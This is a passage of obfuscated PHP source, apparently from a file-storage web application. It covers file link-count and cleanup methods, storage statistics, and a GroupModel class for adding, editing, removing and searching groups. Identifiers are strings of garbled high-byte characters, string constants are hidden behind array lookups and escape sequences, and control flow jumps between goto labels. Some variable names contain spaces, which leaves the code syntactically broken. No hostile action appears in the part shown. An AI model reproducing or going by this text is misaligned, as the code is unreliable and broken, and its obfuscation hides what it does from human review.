1, $F½ÙÈ²’ñÊ[382] => $cáîî„¿¹™, $F½ÙÈ²’ñÊ[732] => $bñÁï¥Ñ¨Â[$F½ÙÈ²’ñÊ[363]], $F½ÙÈ²’ñÊ[383] => $bÉ’ŠÎåå, $F½ÙÈ²’ñÊ[2135] => $dŸ»ª‹…—Œ, $F½ÙÈ²’ñÊ[2136] => $E…÷’±ã¯Á); return $A´¹šÛÂë; goto BëÑ’Ó‰î—; cæÔÊíÎ¦: $F½ÙÈ²’ñÊ =& $_SERVER[Ö¹ñÒÁ²÷]; $bÉ’ŠÎåå = $this->createFileName($cáîî„¿¹™); $Eâö¹¯¤ = get_path_father($bÉ’ŠÎåå); goto Dèáã„Ê; BëÑ’Ó‰î—: } public function addFileCheckExist($fÖ—’Üµ½Ì, $fãÊÔ¤Ñº, $c¥Ã¾³áˆ) { $aêØŠ÷«“• =& $_SERVER[Ö¹ñÒÁ²÷]; $A¸ğì¶÷ñˆ = $this->findByHash($fÖ—’Üµ½Ì, $fãÊÔ¤Ñº); if (!$A¸ğì¶÷ñˆ) { return !1; } $E•ğ–±øÁá = array($aêØŠ÷«“•[2134] => intval($A¸ğì¶÷ñˆ[$aêØŠ÷«“•[2137]]) + 1, $aêØŠ÷«“•[516] => $c¥Ã¾³áˆ); $this->where(array($aêØŠ÷«“•[416] => $A¸ğì¶÷ñˆ[$aêØŠ÷«“•[415]]))->save($E•ğ–±øÁá); return $A¸ğì¶÷ñˆ; } public function remove($c¹Šº¯¶òÕ) { $this->linkCountChange($c¹Šº¯¶òÕ, !1); $this->clearEmpty(); return !0; } public function linkAdd($E¾–ÍŒŒ) { $this->linkCountChange($E¾–ÍŒŒ, !0); } public function linkCountChange($CÂŠŞÒÖÕ, $BßˆÎÉ”æÉ) { goto bÁ–Ğ¦ù­å; d«õéá×: foreach ($C¿Í¨‘¹ê† as $CŸ‚À©¦ÍÚ => $CŞ—ö‡­„ê) { $cˆ÷°Í†ï² = $CŞ—ö‡­„ê . $dÂ‹›‡Ã¡­[33]; if (!$C…îˆ÷Æ­[$cˆ÷°Í†ï²]) { $C…îˆ÷Æ­[$cˆ÷°Í†ï²] = array(); } $C…îˆ÷Æ­[$cˆ÷°Í†ï²][] = $CŸ‚À©¦ÍÚ; } foreach ($C…îˆ÷Æ­ as $CŞ—ö‡­„ê => $Dòßó‰­â½) { if (!$Dòßó‰­â½) { continue; } $CŞ—ö‡­„ê = $BßˆÎÉ”æÉ ? $CŞ—ö‡­„ê : -intval($CŞ—ö‡­„ê); $bÇàÛË×® = array($dÂ‹›‡Ã¡­[415] => array($dÂ‹›‡Ã¡­[7], $Dòßó‰­â½)); if ($CŞ—ö‡­„ê < 0) { $bÇàÛË×®[$dÂ‹›‡Ã¡­[2137]] = array($dÂ‹›‡Ã¡­[925], abs($CŞ—ö‡­„ê)); } $this->where($bÇàÛË×®)->setAdd($dÂ‹›‡Ã¡­[2137], $CŞ—ö‡­„ê); } goto dßÃ÷®¸öˆ; BÙî¶ŞÆğ›: $C¿Í¨‘¹ê† = array(); foreach ($CÂŠŞÒÖÕ as $CŸ‚À©¦ÍÚ) { $cˆ÷°Í†ï² = $CŸ‚À©¦ÍÚ . $dÂ‹›‡Ã¡­[33]; if (!$C¿Í¨‘¹ê†[$cˆ÷°Í†ï²]) { $C¿Í¨‘¹ê†[$cˆ÷°Í†ï²] = 0; } $C¿Í¨‘¹ê†[$cˆ÷°Í†ï²]++; } $C…îˆ÷Æ­ = array(); goto d«õéá×; bÁ–Ğ¦ù­å: $dÂ‹›‡Ã¡­ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$CÂŠŞÒÖÕ) { return; } if (!is_array($CÂŠŞÒÖÕ)) { $CÂŠŞÒÖÕ = array($CÂŠŞÒÖÕ); } goto BÙî¶ŞÆğ›; dßÃ÷®¸öˆ: } public function findByHash($d»ö³Œ–£, $eöëÉãĞõÆ = false) { $DÃòê­ÆÀŠ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$d»ö³Œ–£ && !$eöëÉãĞõÆ) { return !1; } $EÒŞÆÊãö = array($DÃòê­ÆÀŠ[2135] => $d»ö³Œ–£); if ($eöëÉãĞõÆ) { $EÒŞÆÊãö = array($DÃòê­ÆÀŠ[2136] => $eöëÉãĞõÆ); } return $this->order($DÃòê­ÆÀŠ[2138])->where($EÒŞÆÊãö)->find(); } public function clearEmpty($f†¢Ùƒ¥’£ = 0) { goto c“ÎÃ°‚‹¨; B’¿‘¤•Æ‰: $Cëâ¼Ü´ñË = $this->where($Dò‚Õ™¡„¹)->select(); if (!$Cëâ¼Ü´ñË) { return; } $a¨˜±óÍø³ = new Task($C³Öšµ²¿’[2140], $C³Öšµ²¿’[33], count($Cëâ¼Ü´ñË)); goto B½ÏšÉÏ¤ˆ; c“ÎÃ°‚‹¨: $C³Öšµ²¿’ =& $_SERVER[Ö¹ñÒÁ²÷]; $D¢ƒÓ²÷ğÔ = time() - 3600 * 24 * $f†¢Ùƒ¥’£; $Dò‚Õ™¡„¹ = $C³Öšµ²¿’[2139] . $D¢ƒÓ²÷ğÔ; goto B’¿‘¤•Æ‰; B½ÏšÉÏ¤ˆ: foreach ($Cëâ¼Ü´ñË as $DÙà¤ºßËÊ) { $a¨˜±óÍø³->update(1); $this->resetFile($DÙà¤ºßËÊ); } $a¨˜±óÍø³->end(); goto FÂ²Ä»Íâ‘; FÂ²Ä»Íâ‘: } private function resetFile($b¿¥†İøŠ£) { goto fõÁ½·±Ö´; fõÁ½·±Ö´: $bò‰µÎ¿™ =& $_SERVER[Ö¹ñÒÁ²÷]; $AïÔçÁ‰ÉŒ = array($bò‰µÎ¿™[416] => $b¿¥†İøŠ£[$bò‰µÎ¿™[415]]); $còáÜ”Õù = Model($bò‰µÎ¿™[1104])->where($AïÔçÁ‰ÉŒ)->count(); goto Aí«Ö¯”»; Aí«Ö¯”»: $e·„“Şª‹õ = Model($bò‰µÎ¿™[2141])->where($AïÔçÁ‰ÉŒ)->count(); $F¸ôÀ½Š¾â = intval($còáÜ”Õù) + intval($e·„“Şª‹õ); if ($F¸ôÀ½Š¾â == 0) { IO::remove($b¿¥†İøŠ£[$bò‰µÎ¿™[75]]); $this->where($AïÔçÁ‰ÉŒ)->delete(); $this->metaSet($b¿¥†İøŠ£[$bò‰µÎ¿™[415]], null, null); return; } goto e±ê¨ŸÜ; e±ê¨ŸÜ: if ($b¿¥†İøŠ£[$bò‰µÎ¿™[2137]] != $F¸ôÀ½Š¾â) { $this->where($AïÔçÁ‰ÉŒ)->save(array($bò‰µÎ¿™[2134] => $F¸ôÀ½Š¾â)); } goto bàŞ—®Íº¾; bàŞ—®Íº¾: } public function storageInfo($F›¿õ“Öù = false) { goto FâåˆÂ‰‘©; CçÜ·‹„¬: $c„šæöéÊ¾ = 1; $eÄ— Òé¶ = 0; $Fó ºô¦ì¹ = 5000; goto C£æ÷˜Åê; FâåˆÂ‰‘©: $bîÒõ‘‹ìŒ =& $_SERVER[Ö¹ñÒÁ²÷]; $aáá®ª”” = $this->count() + 0.0; $a‰£‰‚í ¡ = 0; goto CçÜ·‹„¬; C£æ÷˜Åê: for ($dÃ ãœ†ğ = 0; $dÃ ãœ†ğ < $aáá®ª””; $dÃ ãœ†ğ = $dÃ ãœ†ğ + $Fó ºô¦ì¹) { $a£†Âí½Â = $this->limit($dÃ ãœ†ğ, $dÃ ãœ†ğ + $Fó ºô¦ì¹)->select(); foreach ($a£†Âí½Â as $E¥šƒ‘·¢) { $c„šæöéÊ¾ += $E¥šƒ‘·¢[$bîÒõ‘‹ìŒ[77]] * $E¥šƒ‘·¢[$bîÒõ‘‹ìŒ[2137]]; $a‰£‰‚í ¡ += $E¥šƒ‘·¢[$bîÒõ‘‹ìŒ[77]] * ($E¥šƒ‘·¢[$bîÒõ‘‹ìŒ[2137]] - 1); $eÄ— Òé¶ += $E¥šƒ‘·¢[$bîÒõ‘‹ìŒ[2137]]; } } $bÁ˜äÊ”ï• = array($bîÒõ‘‹ìŒ[2142] => $c„šæöéÊ¾, $bîÒõ‘‹ìŒ[2143] => $a‰£‰‚í ¡, $bîÒõ‘‹ìŒ[2144] => $a‰£‰‚í ¡ / $c„šæöéÊ¾, $bîÒõ‘‹ìŒ[81] => $aáá®ª””, $bîÒõ‘‹ìŒ[2145] => $eÄ— Òé¶); return $bÁ˜äÊ”ï•; goto bß«†à¼öÇ; bß«†à¼öÇ: } } class GroupModel extends ModelBase { protected $tableName = "\147\162\157\165\x70"; protected $tableMeta = array("\x74\141\x62\154\x65\x4e\x61\155\145" => "\x67\162\157\165\160\137\155\145\x74\141", "\x6d\x65\x74\x61\x46\x69\145\154\144" => "\147\x72\x6f\165\x70\x49\104"); protected function cacheFunctionAlias($fÅÃÀ·ÕÒÏ) { $F“œÏ°‡ŸÔ =& $_SERVER[Ö¹ñÒÁ²÷]; return array($F“œÏ°‡ŸÔ[2146] => array($fÅÃÀ·ÕÒÏ[0], $F“œÏ°‡ŸÔ[2147]), $F“œÏ°‡ŸÔ[2148] => array($fÅÃÀ·ÕÒÏ[0], $F“œÏ°‡ŸÔ[2147])); } protected function getInfo($Dø‰ È±æ) { $D·¢ØïŸ½› = $this->getInfoSimple($Dø‰ È±æ); if (!$D·¢ØïŸ½›) { return !1; } return $this->_listDataApplyItem($D·¢ØïŸ½›); } protected function getInfoSimple($E¤˜²¥¦ï, $FÍçã„¯ÆÁ = false) { $EÔÓºÉÀå… =& $_SERVER[Ö¹ñÒÁ²÷]; if ($FÍçã„¯ÆÁ) { $bÛ‹‘‹£ = array($EÔÓºÉÀå…[2079] => intval($E¤˜²¥¦ï)); $fã‰Å·²Ìâ = $this->where($bÛ‹‘‹£)->find(); return is_array($fã‰Å·²Ìâ) ? $fã‰Å·²Ìâ : array(); } return $this->cacheFunctionGet($EÔÓºÉÀå…[2149], $E¤˜²¥¦ï); } protected function groupAdd($FœÆ˜²ÃÆ) { goto då‰£Ùˆˆ’; C±´õØĞÈ: Model($eê¿šå¸ç[1104])->groupRootAdd($B„ñáªë‰²); return $B„ñáªë‰²; goto fÜÈ†×»ôÚ; F‰Å¹»ÓĞƒ: if (!empty($FœÆ˜²ÃÆ[$eê¿šå¸ç[2079]])) { $D¶âÊŠË‹[$eê¿šå¸ç[2079]] = $FœÆ˜²ÃÆ[$eê¿šå¸ç[2079]]; } $B„ñáªë‰² = $this->add($D¶âÊŠË‹); $this->setNamePinyin($B„ñáªë‰², $D¶âÊŠË‹[$eê¿šå¸ç[28]]); goto C±´õØĞÈ; c¡Ñ¼˜Ğ„: if ($AÇÁÅ‰ã¦Ü[$eê¿šå¸ç[455]]) { $eÒŞ–á©à’ = $AÇÁÅ‰ã¦Ü[$eê¿šå¸ç[455]] . $AÇÁÅ‰ã¦Ü[$eê¿šå¸ç[2079]] . $eê¿šå¸ç[47]; } $D¶âÊŠË‹ = array($eê¿šå¸ç[382] => $this->groupNameAuto($FœÆ˜²ÃÆ[$eê¿šå¸ç[457]], $FœÆ˜²ÃÆ[$eê¿šå¸ç[28]]), $eê¿šå¸ç[364] => $FœÆ˜²ÃÆ[$eê¿šå¸ç[457]], $eê¿šå¸ç[521] => $eÒŞ–á©à’, $eê¿šå¸ç[2150] => $FœÆ˜²ÃÆ[$eê¿šå¸ç[2063]], $eê¿šå¸ç[2151] => 0, $eê¿šå¸ç[2083] => 0); if (isset($FœÆ˜²ÃÆ[$eê¿šå¸ç[2100]])) { $D¶âÊŠË‹[$eê¿šå¸ç[2100]] = $FœÆ˜²ÃÆ[$eê¿šå¸ç[2100]]; } else { $A¯ ‘òÌì = $this->max($eê¿šå¸ç[2100]); if (!$A¯ ‘òÌì) { $A¯ ‘òÌì = 0; } $D¶âÊŠË‹[$eê¿šå¸ç[2100]] = $A¯ ‘òÌì + 1; } goto F‰Å¹»ÓĞƒ; då‰£Ùˆˆ’: $eê¿šå¸ç =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$FœÆ˜²ÃÆ[$eê¿šå¸ç[457]] && isset($FœÆ˜²ÃÆ[$eê¿šå¸ç[2079]]) && $FœÆ˜²ÃÆ[$eê¿šå¸ç[2079]] == 1) { if ($AÇÁÅ‰ã¦Ü = $this->getInfoSimple($FœÆ˜²ÃÆ[$eê¿šå¸ç[2079]], !0)) { return $FœÆ˜²ÃÆ[$eê¿šå¸ç[2079]]; } } else { $AÇÁÅ‰ã¦Ü = $this->getInfoSimple($FœÆ˜²ÃÆ[$eê¿šå¸ç[457]]); if (!$AÇÁÅ‰ã¦Ü) { return !1; } } $eÒŞ–á©à’ = $eê¿šå¸ç[466]; goto c¡Ñ¼˜Ğ„; fÜÈ†×»ôÚ: } protected function groupEdit($aÅßßˆÆÌõ, $b´œ¸ùò) { $DÆâğÈÈÏ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!empty($b´œ¸ùò[$DÆâğÈÈÏ[457]])) { $eãá¥Ù÷õÆ = $this->getInfoSimple($aÅßßˆÆÌõ); $bÍ™ŒÃ•»¸ = $this->getInfoSimple($b´œ¸ùò[$DÆâğÈÈÏ[457]]); if (!$eãá¥Ù÷õÆ || !$bÍ™ŒÃ•»¸) { return !1; } if ($eãá¥Ù÷õÆ[$DÆâğÈÈÏ[2079]] == $bÍ™ŒÃ•»¸[$DÆâğÈÈÏ[2079]]) { return !1; } if ($b´œ¸ùò[$DÆâğÈÈÏ[457]] != $eãá¥Ù÷õÆ[$DÆâğÈÈÏ[457]]) { if ($bÍ™ŒÃ•»¸[$DÆâğÈÈÏ[455]] !== $eãá¥Ù÷õÆ[$DÆâğÈÈÏ[455]] && strpos($bÍ™ŒÃ•»¸[$DÆâğÈÈÏ[455]], $eãá¥Ù÷õÆ[$DÆâğÈÈÏ[455]] . $eãá¥Ù÷õÆ[$DÆâğÈÈÏ[2079]] . $DÆâğÈÈÏ[47]) === 0) { return !1; } $b´œ¸ùò[$DÆâğÈÈÏ[521]] = $bÍ™ŒÃ•»¸[$DÆâğÈÈÏ[455]] . $b´œ¸ùò[$DÆâğÈÈÏ[457]] . $DÆâğÈÈÏ[47]; $this->_changeChildLevel($eãá¥Ù÷õÆ, $bÍ™ŒÃ•»¸); } } if (isset($b´œ¸ùò[$DÆâğÈÈÏ[28]])) { $this->setNamePinyin($aÅßßˆÆÌõ, $b´œ¸ùò[$DÆâğÈÈÏ[28]]); } return $this->where(array($DÆâğÈÈÏ[2152] => $aÅßßˆÆÌõ))->save($b´œ¸ùò); } private function _changeChildLevel($bğäˆä ¥ï, $eÃ¶é†²ÔÑ, $c¼íã‚åô– = false) { goto dµÙ¶„Ñã–; dµÙ¶„Ñã–: $b¹ğ„¾×„ =& $_SERVER[Ö¹ñÒÁ²÷]; $cœò©©š¾¶ = $bğäˆä ¥ï[$b¹ğ„¾×„[455]] . $bğäˆä ¥ï[$b¹ğ„¾×„[2079]] . $b¹ğ„¾×„[47]; $B½§òòğÓ¼ = $eÃ¶é†²ÔÑ[$b¹ğ„¾×„[455]] . $eÃ¶é†²ÔÑ[$b¹ğ„¾×„[2079]] . $b¹ğ„¾×„[47] . $bğäˆä ¥ï[$b¹ğ„¾×„[2079]] . $b¹ğ„¾×„[47]; goto c¬½àâ†Ÿ; Cã¤îÓù«‚: $this->where($C£á†»Àù)->data($c‰’·²©ˆİ)->save(); goto DÍ±¾¢‹­; c¬½àâ†Ÿ: if ($c¼íã‚åô–) { $B½§òòğÓ¼ = $eÃ¶é†²ÔÑ[$b¹ğ„¾×„[455]] . $eÃ¶é†²ÔÑ[$b¹ğ„¾×„[2079]] . $b¹ğ„¾×„[47]; } $C£á†»Àù = array($b¹ğ„¾×„[521] => array($b¹ğ„¾×„[479], $bğäˆä ¥ï[$b¹ğ„¾×„[455]] . $bğäˆä ¥ï[$b¹ğ„¾×„[2079]] . $b¹ğ„¾×„[480])); $c‰’·²©ˆİ = array($b¹ğ„¾×„[521] => array($b¹ğ„¾×„[530], "\162\145\x70\154\x61\x63\145\x28\160\x61\x72\145\x6e\x74\x4c\145\166\x65\154\54\47{$cœò©©š¾¶}\47\54\x27{$B½§òòğÓ¼}\x27\x29")); goto Cã¤îÓù«‚; DÍ±¾¢‹­: } public function setNamePinyin($B ÑîÁè²™, $e¯ÄÖ¦å• = false) { $b²”Ÿˆİ¼ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$e¯ÄÖ¦å•) { $AĞ÷Äéğé = $this->getInfoSimple($B ÑîÁè²™); $e¯ÄÖ¦å• = $AĞ÷Äéğé[$b²”Ÿˆİ¼[28]]; } if (!Input::check($e¯ÄÖ¦å•, $b²”Ÿˆİ¼[524])) { $this->metaSet($B ÑîÁè²™, $b²”Ÿˆİ¼[412], null); $this->metaSet($B ÑîÁè²™, $b²”Ÿˆİ¼[411], null); return; } $c¼ç¸¾¾†å = array($b²”Ÿˆİ¼[412] => str_replace($b²”Ÿˆİ¼[50], $b²”Ÿˆİ¼[33], Pinyin::encode($e¯ÄÖ¦å•)), $b²”Ÿˆİ¼[411] => Pinyin::encode($e¯ÄÖ¦å•, $b²”Ÿˆİ¼[525])); $this->metaSet($B ÑîÁè²™, $c¼ç¸¾¾†å); } protected function groupStatus($BŒÁ×Ë—è, $F¹ùÙ½‰‹£, $AôÙ¬ƒÂÚ¤ = true) { $dŒä½ÄùÕ =& $_SERVER[Ö¹ñÒÁ²÷]; $EÁ»·‚³Óç = $this->getInfoSimple($BŒÁ×Ë—è); if (!$EÁ»·‚³Óç) { return !1; } if ($AôÙ¬ƒÂÚ¤) { $this->_groupStatusApply($EÁ»·‚³Óç, $F¹ùÙ½‰‹£); } $FÃ®„ß¤‰Š = array($dŒä½ÄùÕ[2079] => $BŒÁ×Ë—è, $dŒä½ÄùÕ[89] => $dŒä½ÄùÕ[686], $dŒä½ÄùÕ[355] => $F¹ùÙ½‰‹£); return Model($dŒä½ÄùÕ[2153])->add($FÃ®„ß¤‰Š, array(), !0); } private function _groupStatusApply($a¤†¬í·ëù, $eò§«ë¼˜) { $AÓ¶ñ§²ù„ =& $_SERVER[Ö¹ñÒÁ²÷]; if ($eò§«ë¼˜ == $AÓ¶ñ§²ù„[83]) { $a«…„µ©‡ = $this->parentLevelArray($a¤†¬í·ëù[$AÓ¶ñ§²ù„[455]]); } else { $A‡¤½Ü¬‰Ã = array($AÓ¶ñ§²ù„[521] => array($AÓ¶ñ§²ù„[479], $a¤†¬í·ëù[$AÓ¶ñ§²ù„[455]] . $a¤†¬í·ëù[$AÓ¶ñ§²ù„[2079]] . $AÓ¶ñ§²ù„[480])); $a«…„µ©‡ = $this->where($A‡¤½Ü¬‰Ã)->field($AÓ¶ñ§²ù„[2079])->select(); $a«…„µ©‡ = array_to_keyvalue($a«…„µ©‡, $AÓ¶ñ§²ù„[33], $AÓ¶ñ§²ù„[2079]); } if (empty($a«…„µ©‡)) { return; } $A‡¤½Ü¬‰Ã = array($AÓ¶ñ§²ù„[2079] => array($AÓ¶ñ§²ù„[7], $a«…„µ©‡), $AÓ¶ñ§²ù„[89] => $AÓ¶ñ§²ù„[686], $AÓ¶ñ§²ù„[355] => $eò§«ë¼˜ ? $AÓ¶ñ§²ù„[464] : $AÓ¶ñ§²ù„[83]); Model($AÓ¶ñ§²ù„[2153])->where($A‡¤½Ü¬‰Ã)->save(array($AÓ¶ñ§²ù„[355] => $eò§«ë¼˜)); } protected function groupRemove($e¾Ûê®£ÛÏ) { goto Dš‚ÂÃÓ; eÏ··àÁ´: $this->where(array($Bö‰¯ÕŠ¡É[457] => $e¾Ûê®£ÛÏ))->save(array($Bö‰¯ÕŠ¡É[457] => $C²½Æ§¶[$Bö‰¯ÕŠ¡É[457]])); Model($Bö‰¯ÕŠ¡É[2153])->where($Dßğ„¬Ãó¶)->delete(); Model($Bö‰¯ÕŠ¡É[2154])->where($Dßğ„¬Ãó¶)->delete(); goto b¯æƒŒ˜³Î; b¯æƒŒ˜³Î: Model($Bö‰¯ÕŠ¡É[749])->groupRootRemove($e¾Ûê®£ÛÏ); return $this->where($Dßğ„¬Ãó¶)->delete(); goto F«Êòƒãñ; fà”¶ãø¸: if (!$C²½Æ§¶ || $C²½Æ§¶[$Bö‰¯ÕŠ¡É[457]] == 0) { return !1; } $Bí¢—‘ß§ = $this->getInfoSimple($C²½Æ§¶[$Bö‰¯ÕŠ¡É[457]]); $this->_changeChildLevel($C²½Æ§¶, $Bí¢—‘ß§, !0); goto eÏ··àÁ´; Dš‚ÂÃÓ: $Bö‰¯ÕŠ¡É =& $_SERVER[Ö¹ñÒÁ²÷]; $Dßğ„¬Ãó¶ = array($Bö‰¯ÕŠ¡É[2079] => $e¾Ûê®£ÛÏ); $C²½Æ§¶ = $this->where($Dßğ„¬Ãó¶)->find(); goto fà”¶ãø¸; F«Êòƒãñ: } public function listData() { $c£ÚÛŸ‘›¶ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($c£ÚÛŸ‘›¶[$_SERVER[Ö¹ñÒÁ²÷][350]]); return $c£ÚÛŸ‘›¶; } private function _makeOrder($F½ôöâ ¯ = '') { goto BÃŸ‹é¹êˆ; FªÙ’¾¬åá: $F½ôöâ ¯ = $F½ôöâ ¯ . "{$AÛ©®ç‡}\x20{$a¶Ö¨Ùìò¤}\x2c\40\147\162\157\x75\x70\x49\104\40\x61\x73\143"; return $this->order($F½ôöâ ¯); goto eŒ’Ë›¾; EÁÌ¬’š‡è: $AÛ©®ç‡ = Input::get($aÚöƒÌ˜—…[403], $aÚöƒÌ˜—…[7], $aÚöƒÌ˜—…[2083], $aÜ“›íÉà); $a¶Ö¨Ùìò¤ = Input::get($aÚöƒÌ˜—…[404], $aÚöƒÌ˜—…[7], $aÚöƒÌ˜—…[2155], array($aÚöƒÌ˜—…[2155], $aÚöƒÌ˜—…[400])); $a¶Ö¨Ùìò¤ = $d‡Ù¡Şºš[$a¶Ö¨Ùìò¤]; goto FªÙ’¾¬åá; BÃŸ‹é¹êˆ: $aÚöƒÌ˜—… =& $_SERVER[Ö¹ñÒÁ²÷]; $aÜ“›íÉà = array($aÚöƒÌ˜—…[2079], $aÚöƒÌ˜—…[28], $aÚöƒÌ˜—…[2065], $aÚöƒÌ˜—…[183]); $d‡Ù¡Şºš = array($aÚöƒÌ˜—…[398] => $aÚöƒÌ˜—…[399], $aÚöƒÌ˜—…[400] => $aÚöƒÌ˜—…[401]); goto EÁÌ¬’š‡è; eŒ’Ë›¾: } public function listChild($aœ”ô¾êö) { $B…£³—‡‘‹ =& $_SERVER[Ö¹ñÒÁ²÷]; $f‚‘ÊØ‡Ñš = $this->where(array($B…£³—‡‘‹[457] => $aœ”ô¾êö))->_makeOrder()->selectPage(200); $this->_listDataApply($f‚‘ÊØ‡Ñš[$B…£³—‡‘‹[350]]); return $f‚‘ÊØ‡Ñš; } public function listByID($D¯‘²ì› Ô) { $féŒÄŞÍÏä =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$D¯‘²ì› Ô) { return array(); } $bŠ½œ°‚÷ = array($féŒÄŞÍÏä[2079] => array($féŒÄŞÍÏä[7], $D¯‘²ì› Ô)); $D²º ’ôƒ½ = $this->where($bŠ½œ°‚÷)->select(); $this->_listDataApply($D²º ’ôƒ½); return $D²º ’ôƒ½; } public function listSearch($fóóÜ˜…Œ) { goto Aàê õÀ°Ş; D¤—ĞÅâì„: if (!trim($Fí»Á®„ç)) { return !1; } $Fí»Á®„ç = str_replace($bëªŠÌ‡í [2158], $bëªŠÌ‡í [2159], $Fí»Á®„ç); $DˆİÚ·ïï– = array($bëªŠÌ‡í [2079] => array($bëªŠÌ‡í [748], "\x25{$Fí»Á®„ç}\x25"), $bëªŠÌ‡í [28] => array($bëªŠÌ‡í [748], "\x25{$Fí»Á®„ç}\x25"), $bëªŠÌ‡í [910] => $bëªŠÌ‡í [2160]); goto E™Ï‘í¦Â©; Aàê õÀ°Ş: $bëªŠÌ‡í  =& $_SERVER[Ö¹ñÒÁ²÷]; $Fí»Á®„ç = $fóóÜ˜…Œ[$bëªŠÌ‡í [2156]]; $e·§¼»õó = isset($fóóÜ˜…Œ[$bëªŠÌ‡í [2157]]) ? $fóóÜ˜…Œ[$bëªŠÌ‡í [2157]] : !1; goto D¤—ĞÅâì„; E™Ï‘í¦Â©: $BóéùÉ¾´Ù = $this->_makeOrder()->where($DˆİÚ·ïï–)->selectPage(20); $BóéùÉ¾´Ù = $BóéùÉ¾´Ù ? $BóéùÉ¾´Ù : array(); if (!$BóéùÉ¾´Ù || count($BóéùÉ¾´Ù[$bëªŠÌ‡í [350]]) < 5 && Input::check($Fí»Á®„ç, $bëªŠÌ‡í [302])) { $aİ–å«œÀ = $this->_searchFromMeta($bëªŠÌ‡í [411], $Fí»Á®„ç, 10); $c¤áì§½åù = $this->_searchFromMeta($bëªŠÌ‡í [412], $Fí»Á®„ç, 10); $aéè³Íê¡Ÿ = array_merge($aİ–å«œÀ, $c¤áì§½åù, $BóéùÉ¾´Ù[$bëªŠÌ‡í [350]]); $BóéùÉ¾´Ù[$bëªŠÌ‡í [350]] = array_unique_by_key($aéè³Íê¡Ÿ, $bëªŠÌ‡í [2079]); $BóéùÉ¾´Ù[$bëªŠÌ‡í [347]][$bëªŠÌ‡í [348]] = count($BóéùÉ¾´Ù[$bëªŠÌ‡í [350]]); $BóéùÉ¾´Ù[$bëªŠÌ‡í [347]][$bëªŠÌ‡í [349]] = ceil($BóéùÉ¾´Ù[$bëªŠÌ‡í [347]][$bëªŠÌ‡í [348]] / $BóéùÉ¾´Ù[$bëªŠÌ‡í [347]][$bëªŠÌ‡í [345]]); } goto E‘ùÌÌÊÌñ; E‘ùÌÌÊÌñ: $this->_listDataApply($BóéùÉ¾´Ù[$bëªŠÌ‡í [350]]); return $BóéùÉ¾´Ù; goto cíÎ®â‘Ó­; cíÎ®â‘Ó­: } private function _searchFromMeta($cÖÔåæ“¹Š, $c—éë©ø½ò, $C´Ö˜’í) { goto a¡²¨±ìó£; a¡²¨±ìó£: $e‘‹”ôöÈÛ =& $_SERVER[Ö¹ñÒÁ²÷]; $c—éë©ø½ò = strtolower($c—éë©ø½ò); $f·ŞÑçÖÔ = array($e‘‹”ôöÈÛ[89] => $cÖÔåæ“¹Š, $e‘‹”ôöÈÛ[355] => array($e‘‹”ôöÈÛ[748], "\45{$c—éë©ø½ò}\45")); goto B…²´¼‚èŞ; C†‡èƒá†‚: $DÈİÉ±·¿± = $this->where(array($e‘‹”ôöÈÛ[2152] => array($e‘‹”ôöÈÛ[7], $AÁ¹Ãöá˜§)))->select(); if (!$DÈİÉ±·¿±) { return array(); } return $DÈİÉ±·¿±; goto CÁ´‹ƒ‘ßÓ; B…²´¼‚èŞ: $AÁ¹Ãöá˜§ = Model($e‘‹”ôöÈÛ[2161])->where($f·ŞÑçÖÔ)->limit($C´Ö˜’í)->select(); if (!$AÁ¹Ãöá˜§) { return array(); } $AÁ¹Ãöá˜§ = array_to_keyvalue($AÁ¹Ãöá˜§, $e‘‹”ôöÈÛ[33], $e‘‹”ôöÈÛ[2079]); goto C†‡èƒá†‚; CÁ´‹ƒ‘ßÓ: } protected function _listDataApplyItem($f¤Ú«ˆÑÍ½) { $C¨ª©Õš = array($f¤Ú«ˆÑÍ½); $this->_listDataApply($C¨ª©Õš); return $C¨ª©Õš[0]; } protected function _listDataApply(&$c‡²›„™ñ®) { goto C‹çÃ„¢å™; Aç¨“ §Œ¶: $this->_listAppendChildren($c‡²›„™ñ®); $this->_listAppendChildrenMember($c‡²›„™ñ®); $this->_listAppendMeta($c‡²›„™ñ®, $BŞáğ¦Ì³â); goto AÀŞñÄˆ÷™; AÀŞñÄˆ÷™: $this->_listAppendParent($c‡²›„™ñ®); $this->_listAppendSourceRoot($c‡²›„™ñ®, $BŞáğ¦Ì³â); goto c³Ó”¶Óê; C‹çÃ„¢å™: $a¿Ö´µÕŠ‚ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!$c‡²›„™ñ®) { return; } $BŞáğ¦Ì³â = array_to_keyvalue($c‡²›„™ñ®, $a¿Ö´µÕŠ‚[33], $a¿Ö´µÕŠ‚[2079]); goto Aç¨“ §Œ¶; c³Ó”¶Óê: } private function _listAppendChildren(&$Cª†ëšÎ) { goto A³¾÷í†Í; A³¾÷í†Í: $A¡ÌƒÂèŸé =& $_SERVER[Ö¹ñÒÁ²÷]; $fšÄÖù‡Ô = $A¡ÌƒÂèŸé[357]; $D²¿Ş˜Ò›¥ = array(); goto c«Ôµ”ËÆ; cùÆß¡Êç: $D²¿Ş˜Ò›¥ = array_to_keyvalue($D²¿Ş˜Ò›¥, $A¡ÌƒÂèŸé[446]); foreach ($Cª†ëšÎ as &$B¯‹ÌÕ©î) { $B¯‹ÌÕ©î[$A¡ÌƒÂèŸé[2162]] = isset($D²¿Ş˜Ò›¥[$B¯‹ÌÕ©î[$A¡ÌƒÂèŸé[2079]] . $A¡ÌƒÂèŸé[2163]]); } goto b«Ù¸ÅëŒ; c«Ôµ”ËÆ: $B®…ë¸Ï¥³ = count($Cª†ëšÎ); $DÓóŸ¯‰¢˜ = $this->tablePrefix . $this->tableName; for ($eïïöÇ†Ïª = 0, $fŞ•˜… = 0; $eïïöÇ†Ïª < $B®…ë¸Ï¥³; $eïïöÇ†Ïª++) { $fŞ•˜…++; $D™ë«Ø•ğŠ = $Cª†ëšÎ[$eïïöÇ†Ïª][$A¡ÌƒÂèŸé[2079]]; $fšÄÖù‡Ô .= 